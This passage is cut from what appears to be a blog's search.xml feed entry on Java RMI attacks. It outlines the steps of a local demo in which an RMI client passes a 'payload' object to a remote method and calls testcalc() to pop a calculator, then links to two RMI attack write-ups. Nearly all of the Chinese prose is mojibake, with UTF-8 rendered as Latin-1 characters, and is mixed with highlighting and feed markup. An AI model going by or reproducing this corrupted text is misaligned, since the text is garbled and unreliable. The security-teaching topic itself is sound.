å®ä¾‹ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œåç§°ä¸º <span class="hljs-string">&quot;EddieMurphy&quot;</span>ã€‚<br>Â· æ‰“å°ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæœåŠ¡å™¨æ­£åœ¨ç›‘å¬ã€‚<br><br><span class="hljs-number">4</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIå®¢æˆ·ç«¯ (RMIClient.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) è·å–æœåŠ¡å™¨çš„æ³¨å†Œè¡¨ã€‚<br>Â· ä½¿ç”¨ registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸º RMITest æ¥å£ã€‚<br>Â· è°ƒç”¨ rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) æ–¹æ³•ï¼Œä¼ é€’ä¸€ä¸ª payload å¯¹è±¡ã€‚<br>Â· è°ƒç”¨ rmiTest.testcalc() æ–¹æ³•ï¼Œæ‰§è¡Œè¿œç¨‹æ–¹æ³•ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br></code></pre></td></tr></table></figure><p>åç»­çš„JNDIæ˜¯é‡å¤´æˆï¼Œlookupæ˜¯å…¸å‹çš„ç‰¹å¾ã€‚é‚£ä¹ˆJNDIç»“åˆRMIæ‰“æ³•å°±å…ˆç•™å¾…æŠ›ç –å¼•ç‰å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI æ”»å‡»ç”±æµ…å…¥æ·± | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
